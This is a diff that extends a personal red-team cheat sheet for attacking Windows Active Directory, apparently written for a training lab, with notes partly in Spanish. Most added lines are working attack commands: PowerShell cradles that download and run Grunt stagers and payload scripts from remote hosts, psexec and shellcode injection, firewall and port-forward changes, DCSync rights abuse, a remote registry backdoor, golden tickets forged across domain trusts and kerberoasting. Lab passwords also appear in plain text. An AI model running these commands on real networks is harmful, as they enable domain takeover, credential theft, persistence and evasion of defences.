@@ -1,4 +1,20 @@
 SharpShell var defender = SCM.GetService("hostname", "WinDefend"); return defender.Status.ToString();
+use post/windows/manage/shellcode_inject  crea un .bin en covenant
+use exploit/windows/smb/psexec
+netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allow protocol=TCP localport=8080
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
+portfwd add -R -p 8080 -l 80 -L 10.8.0.6
+PowerShell $PID % Setabelt MappDrivers
+PS > $grunt = (new-object net.webclient).downloaddata("http://10.8.0.6/http-grunt.exe")
+PS > [System.Reflection.Assembly]::Load($grunt)
+PS > [GruntStager.GruntStager]::Execute()
+iex (new-object net.webclient).downloadstring("http://x.x.x.x/bypass.ps1"); iex (new-object net.webclient).downloadstring("http://x.x.x.x/payload.ps1")
+$bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
+[System.Reflection.Assembly]::Load($bytes)
+rundll32.exe PowerShdll.dll,main "$ExecutionContext.SessionState.LanguageMode"
+
+-------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------
 # APPLOCKER
 Find  GpcFileSysPath of the GPO
 KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
@@ -8,6 +24,7 @@ KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\f9ec2ad9-2412-431e-a
 # Host Reconnaissance
 ImpersonatProcess
 Seatbelt -group=system
+Seatbelt MappedDrives (c:\, d:\) averigurar el proceso  PowerShell $PID
 PortScan fs-1,dc-1 135,445,3389,4444,5985 
 
 #Persistence
@@ -251,6 +268,7 @@ ImpersonateProcess 2768 n proceso
 PowerShellRemotingGrunt dc-1 PowerShell
 
 The "Printer Bug"
+https://blog.ettic.ca/northsec-2019-windows-track-writeup-69d5bcf06abd
 Assembly /assemblyname:"Rubeus" /parameters:"dump /service:krbtgt"
 MakeToken Administrator CYBER DoesNotMatter
 DCSync CYBER\krbtgt
@@ -396,10 +414,14 @@ powershell_execute Invoke-PrivescAudit
 execute -H -c -i -f JuicyPotato.exe -a "-t * -p C:\Temp\msf.exe -l 1337"
 
 #Domain Dominance
+PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=cyberbotic,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync
 krbtgt NTLM
 mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
 
 #Remote Registry Backdoor
+PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
+PowerShell Add-RemoteRegBackdoor -ComputerName dc-1 -Trustee CYBER\s.ball
+RemoteHashRetrieval.ps1
 PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
 
 #Golden Tickets
@@ -416,6 +438,18 @@ kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /tic
 kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
 
 #Domain Trusts
+OneWay
+PowerShell Get-DomainTrust -Domain dev.zeropointsecurity.co.uk
+PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
+Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
+Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
+Rubeus kerberoast /domain:dev.zeropointsecurity.co.uk
+Bidirectional
+PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain zeropointsecurity.co.uk | select ObjectSid
+mimikatz # kerberos::golden /user:Administrator /domain:dev.zeropointsecurity.co.uk /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi
+
+
+
 python3 bloodhound.py -u user -p pass -d domain -gc FQDN_DC -c All -ns ip
 proxychains bloodhound-python -c all -u n.glover  -p BenNev\!s  -d cyberbotic.io -ns 10.10.120.1  --dns-tcp     
 proxychains bloodhound-python -c all -u bridgesb  -p Scorpion!  -d dev.zeropointsecurity.co.uk -ns 10.95.108.1 -gc AD02  --dns-tcp   
@@ -489,7 +523,7 @@ ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntExecutor.bin -e AMSI
 #AppLocker
 Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
 rundll32.exe
-
+------------------------------------------------------------------
 -------------------------------------------------------------------
 BLOODHOUND-TIPS
 https://medium.com/@riccardo.ancarani94/bloodhound-tips-and-tricks-e1853c4b81ad
@@ -502,7 +536,14 @@ Info
 Reachable
 MATCH p=shortestPath((c {owned: true})-[*1..3]->(s)) WHERE NOT c = s RETURN p
 MATCH p=shortestPath((c {owned: true})-[*1..]->(s:Computer)) WHERE NOT c = s RETURN p
-
+MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+MATCH (u:User {owned:true}) RETURN u
+MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p
+MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
+MATCH (u:User {owned:true}), (c:Computer {name: "SRV-2.CHILD.REDTEAMOPS.LOCAL"}), p=shortestPath((u)-[*1..]->(c)) RETURN p
+MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
+MATCH (c:Computer {haslaps: true}) RETURN c
 GPO ABUSE
 https://wald0.com/?p=112
 
